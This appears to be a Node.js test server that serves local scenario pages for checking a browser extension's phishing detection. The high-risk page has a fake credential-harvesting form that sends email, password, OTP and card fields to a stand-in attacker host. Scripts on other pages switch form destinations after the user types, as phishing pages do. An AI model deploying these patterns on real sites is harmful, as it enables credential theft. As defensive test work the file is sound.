import http from "node:http";

const host = "127.0.0.1";
const port = Number(process.env.CAPSTONE_MANUAL_PORT || 41731);

function pageTemplate(title, body, extraHead = "", extraScript = "") {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>${title}</title>
  <style>
    body { font-family: Segoe UI, Tahoma, sans-serif; margin: 24px; line-height: 1.45; }
    h1 { margin-bottom: 8px; }
    .card { border: 1px solid #ccc; border-radius: 8px; padding: 16px; margin-top: 12px; }
    .pill { display: inline-block; border-radius: 12px; padding: 2px 10px; background: #f0f0f0; margin-right: 8px; }
    code { background: #f5f5f5; padding: 2px 6px; border-radius: 4px; }
    nav a { margin-right: 12px; }
  </style>
  ${extraHead}
</head>
<body>
  <nav>
    <a href="/">Index</a>
    <a href="/benign">Benign</a>
    <a href="/suspicious">Suspicious</a>
    <a href="/high-risk">High-risk</a>
    <a href="/dynamic">Dynamic</a>
    <a href="/privacy">Privacy</a>
  </nav>
  ${body}
  ${extraScript}
</body>
</html>`;
}

const indexHtml = pageTemplate(
  "CAPSTONE-1 Manual Browser Scenarios",
  `<h1>CAPSTONE-1 Manual Scenario Index</h1>
  <p>Use these controlled pages for manual extension acceptance.</p>
  <div class="card">
    <div><span class="pill">BENIGN</span><a href="/benign">/benign</a></div>
    <div><span class="pill">SUSPICIOUS</span><a href="/suspicious">/suspicious</a></div>
    <div><span class="pill">HIGH_RISK</span><a href="/high-risk">/high-risk</a></div>
    <div><span class="pill">DYNAMIC</span><a href="/dynamic">/dynamic</a></div>
    <div><span class="pill">PRIVACY</span><a href="/privacy">/privacy</a></div>
  </div>
  <div class="card">
    <p>DNR manual target URL:</p>
    <code>http://test-phish-dnr-blocked.example.com/</code>
  </div>`
);

const benignHtml = pageTemplate(
  "Benign Scenario",
  `<h1>Benign Scenario</h1>
  <p>Expected policy outcome: ALLOWED (same-domain authentication).</p>
  <form action="/login" method="post">
    <label>Email <input type="email" name="email" autocomplete="email" /></label><br /><br />
    <label>Password <input type="password" name="password" autocomplete="current-password" /></label><br /><br />
    <button type="submit">Sign In</button>
  </form>`
);

const suspiciousHtml = pageTemplate(
  "Suspicious Scenario",
  `<h1>Suspicious Scenario</h1>
  <p>Expected policy outcome: WARNED (cross-domain credential request).</p>
  <form action="http://localhost:${port}/sink" method="post">
    <label>Email <input type="email" name="email" autocomplete="email" /></label><br /><br />
    <label>Password <input type="password" name="password" autocomplete="current-password" /></label><br /><br />
    <label>OTP <input type="text" name="otp" autocomplete="one-time-code" /></label><br /><br />
    <button type="submit">Continue</button>
  </form>`
);

const highRiskHtml = pageTemplate(
  "High-risk Synthetic Scenario",
  `<h1>High-risk Synthetic Scenario</h1>
  <p>Expected policy outcome: CONTAINED_AFTER_LOAD or BLOCKED.</p>
  <form action="https://credential-harvest.synthetic-attacker.example/submit" method="post">
    <label>Email <input type="email" name="email" autocomplete="email" /></label><br /><br />
    <label>Password <input type="password" name="password" autocomplete="current-password" /></label><br /><br />
    <label>OTP <input type="text" name="otp" autocomplete="one-time-code" /></label><br /><br />
    <label>Card <input type="text" name="card" autocomplete="cc-number" /></label><br /><br />
    <button type="submit">Verify & Submit</button>
  </form>`
);

const dynamicHtml = pageTemplate(
  "Dynamic DOM Scenario",
  `<h1>Dynamic DOM Scenario</h1>
  <p>Expected: dynamic password/OTP/form/action changes are detected.</p>
  <div id="host" class="card">Waiting for dynamic mutations...</div>`,
  "",
  `<script>
    const host = document.getElementById("host");

    setTimeout(() => {
      const form = document.createElement("form");
      form.id = "dynamic-login";
      form.action = "https://dynamic-start.example/login";
      form.method = "post";

      const email = document.createElement("input");
      email.type = "email";
      email.name = "email";
      email.autocomplete = "email";

      const pass = document.createElement("input");
      pass.type = "password";
      pass.name = "password";
      pass.autocomplete = "current-password";

      form.appendChild(email);
      form.appendChild(document.createElement("br"));
      form.appendChild(pass);
      host.appendChild(form);
      host.appendChild(document.createElement("hr"));
      host.appendChild(document.createTextNode("Step 1 complete: dynamic form + email + password."));
    }, 700);

    setTimeout(() => {
      const form = document.getElementById("dynamic-login");
      if (form) {
        const otp = document.createElement("input");
        otp.type = "text";
        otp.name = "otp";
        otp.autocomplete = "one-time-code";
        form.appendChild(document.createElement("br"));
        form.appendChild(otp);
      }
      host.appendChild(document.createElement("hr"));
      host.appendChild(document.createTextNode("Step 2 complete: dynamic OTP."));
    }, 1500);

    setTimeout(() => {
      const form = document.getElementById("dynamic-login");
      if (form) {
        form.action = "http://localhost:${port}/sink";
      }
      host.appendChild(document.createElement("hr"));
      host.appendChild(document.createTextNode("Step 3 complete: form action changed."));
    }, 2300);
  </script>`
);

const privacyHtml = pageTemplate(
  "Privacy Boundary Scenario",
  `<h1>Privacy Boundary Scenario</h1>
  <p>Expected: input.value getter should not be read by extension collector.</p>
  <form action="/noop" method="post">
    <label>User <input id="u" type="text" name="user" value="victim_user" /></label><br /><br />
    <label>Password <input id="p" type="password" name="password" value="SuperSecretPassword123!" /></label><br /><br />
    <label>OTP <input id="o" type="text" name="otp" value="998877" /></label>
  </form>
  <div class="card" id="privacy-log">value getter reads: 0</div>`,
  "",
  `<script>
    let valueReadCount = 0;
    const desc = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value");
    if (desc && desc.get && desc.set) {
      Object.defineProperty(HTMLInputElement.prototype, "value", {
        get: function () {
          valueReadCount += 1;
          const el = document.getElementById("privacy-log");
          if (el) el.textContent = "value getter reads: " + valueReadCount;
          return desc.get.call(this);
        },
        set: function (v) {
          return desc.set.call(this, v);
        }
      });
    }
  </script>`
);

// Authored controlled cases: labels express simulated intent, never real-world adjudication.
function researchPage(family, label, layout) {
  const cross = `http://localhost:${port}/sink`;
  return pageTemplate('Controlled event research', `
    <main data-layout="${layout}"><form id="auth" action="/sink" method="post"><input type="password" autocomplete="current-password"><button>Submit</button></form>
    <form id="other" action="${cross}" method="post"><input type="text"></form></main>`, '', `<script>
    window.runScenario = async () => {
      const auth = document.getElementById('auth'), other = document.getElementById('other');
      const interact = () => auth.querySelector('input').dispatchEvent(new Event('input', { bubbles: true }));
      const tick = () => new Promise(r => setTimeout(r, 50));
      if (${family} === 1) { // Sensitive versus unrelated form gets the external target.
        if (${label}) { auth.action = '${cross}'; other.action = '/sink'; }
        await tick(); interact();
      } else if (${family} === 2) { // Destination change after versus before interaction.
        if (${label}) { interact(); await tick(); auth.action = '${cross}'; }
        else { auth.action = '${cross}'; await tick(); interact(); }
      } else if (${family} === 3) { // Dynamically inserted credential category bound to different form.
        const otp = document.createElement('input'); otp.autocomplete = 'one-time-code';
        (${label} ? auth : other).append(otp); interact(); await tick();
        if (${label}) auth.action = '${cross}';
      } else if (${family} === 4) { // Same-origin versus cross-origin request after interaction.
        interact(); await tick(); await fetch(${label} ? '${cross}' : '/sink', { mode: 'no-cors', method: 'POST' });
      } else if (${family} === 5) { // Password/OTP escalation with versus without late destination change.
        interact(); await tick(); const otp = document.createElement('input'); otp.autocomplete = 'one-time-code'; auth.append(otp);
        await tick(); otp.dispatchEvent(new Event('input', { bubbles: true }));
        if (${label}) { await tick(); auth.action = '${cross}'; }
      } else { // Observational ambiguity: delegated auth versus simulated abuse have identical metadata.
        auth.action = '${cross}'; await tick(); interact();
      }
      await tick();
    };
    </script>`);
}

let blockedProbeReceipts = 0;
const server = http.createServer((req, res) => {
  const parsed = new URL(req.url || '/', `http://127.0.0.1:${port}`);
  const url = parsed.pathname;
  if (url === '/blocked') blockedProbeReceipts++;
  if (url === '/test-receiver-count') { res.setHeader('content-type', 'application/json'); res.end(JSON.stringify({ blocked_probe_receipts: blockedProbeReceipts })); return; }
  if (url === '/sink' || url === '/login' || url === '/noop') { res.end('controlled sink'); return; }
  if (url === '/banking') { res.writeHead(302, { Location: '/benign' }); res.end(); return; }
  if (url === '/embedded') { res.setHeader('content-type', 'text/html'); res.end(pageTemplate('Controlled embedded authentication', `<iframe src="http://localhost:${port}/benign"></iframe>`)); return; }
  if (['/oauth', '/sso', '/federated', '/cross-origin'].includes(url)) {
    res.setHeader('content-type', 'text/html'); res.end(researchPage(6, 0, 0)); return;
  }
  if (url === '/payment') { res.setHeader('content-type', 'text/html'); res.end(pageTemplate('Controlled payment metadata', `<form action="http://localhost:${port}/sink"><input autocomplete="cc-number"><input autocomplete="cc-csc"><button>Pay</button></form>`)); return; }
  if (url === '/research') {
    const family = Number(parsed.searchParams.get('family'));
    const label = Number(parsed.searchParams.get('label'));
    const layout = Number(parsed.searchParams.get('layout'));
    if (![1,2,3,4,5,6].includes(family) || ![0,1].includes(label) || ![0,1].includes(layout)) { res.writeHead(400); res.end(); return; }
    res.setHeader('content-type', 'text/html'); res.end(researchPage(family, label, layout)); return;
  }
  const map = {
    "/": indexHtml,
    "/benign": benignHtml,
    "/suspicious": suspiciousHtml,
    "/high-risk": highRiskHtml,
    "/dynamic": dynamicHtml,
    "/privacy": privacyHtml,
  };

  const body = map[url] || pageTemplate("Not Found", `<h1>404</h1><p>${url}</p>`);
  const status = map[url] ? 200 : 404;
  res.writeHead(status, { "content-type": "text/html; charset=utf-8" });
  res.end(body);
});

server.listen(port, host, () => {
  console.log("CAPSTONE_MANUAL_SERVER_READY");
  console.log(`URL=http://${host}:${port}/`);
  console.log("DNR_TARGET=http://test-phish-dnr-blocked.example.com/");
});
